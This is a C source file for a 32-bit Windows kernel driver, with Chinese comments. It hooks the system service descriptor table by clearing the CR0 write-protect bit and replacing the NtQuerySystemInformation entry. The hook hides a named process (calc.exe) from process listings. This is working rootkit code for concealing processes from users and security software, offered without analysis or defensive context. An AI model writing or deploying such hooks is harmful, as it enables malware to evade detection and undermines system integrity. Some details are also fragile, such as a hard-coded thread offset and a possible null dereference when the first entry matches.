#include "DriverMain.h"

NTQUERYSYSTEMINFORMATION oldNtQuerySystemInformation;//原始函数地址
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)
{
	KdPrint(("DriverStart"));
	PKSYSTEM_SERVICE_TABLE ptrServiceTable = 0;//用来接收SSDT的指针
	ptrServiceTable = FindSSDTTable();
	//__debugbreak();
	KillProtect();//关闭只读保护
	oldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)ptrServiceTable->ServiceTableBase[0x105];//保存原始SSDT函数地址
	ptrServiceTable->ServiceTableBase[0x105]=(ULONG)MyZwQuerySystemInformation;
	StartProtect();//开启只读保护

	DriverObject->DriverUnload = UnLoadDriver;
	return STATUS_SUCCESS;
}
/*获取SSDT地址*/
PKSYSTEM_SERVICE_TABLE FindSSDTTable()
{
	PETHREAD ptrKThread = PsGetCurrentThread();//获取KTHREAD
	PKSERVICE_TABLE_DESCRIPTOR ptrServiceTable =  (PKSERVICE_TABLE_DESCRIPTOR)( *(PULONG)((ULONG)ptrKThread + 0xbc) );//固定偏移取服务描述表
	PKSYSTEM_SERVICE_TABLE SSDT =  &(ptrServiceTable->ntoskrnl);
	KdPrint(("FindSSDT"));
	return SSDT;//SSDT
}
/*关闭只读保护*/
VOID  _declspec(naked) KillProtect()
{
	__asm
	{
		push eax;
		mov eax,cr0;
		and eax,~0x10000;//取反
		mov cr0,eax;
		pop eax;
		ret;
	}
}
/*开启只读保护*/
VOID _declspec(naked) StartProtect()
{
	__asm
	{
		push eax;
		mov eax,cr0;
		or eax,0x10000;
		mov cr0,eax;
		pop eax;
		ret;
	}
}
/*自己的ZwQuerySystemInformation*/
NTSTATUS NTAPI MyZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)
{
	NTSTATUS rtStatus;
	rtStatus = oldNtQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
	if(NT_SUCCESS(rtStatus))
	{
		if(SystemInformationClass == SystemProcessInformation)//查询的是进程信息
		{
			PSYSTEM_PROCESS_INFORMATION pcurr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
			PSYSTEM_PROCESS_INFORMATION plast = NULL;//遍历
			WCHAR *tmp = L"calc.exe";
			while(TRUE)
			{
				
				if((PWSTR)pcurr->Reserved2[1] != NULL)
				{
					if(!wcscmp(tmp,(WCHAR*)pcurr->Reserved2[1]))
					{
						if(pcurr->NextEntryOffset == 0)
							plast->NextEntryOffset = 0;
						else
							plast->NextEntryOffset += pcurr->NextEntryOffset;
					}
					else
						plast = pcurr;
				}
				if(pcurr->NextEntryOffset == 0)
				{
					break;
				}
				pcurr = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pcurr + pcurr->NextEntryOffset);

			}
		}
	}
	
	return rtStatus;
}
VOID UnLoadDriver(PDRIVER_OBJECT pDriverObject)
{
	KdPrint(("UnloadDriver success!"));
}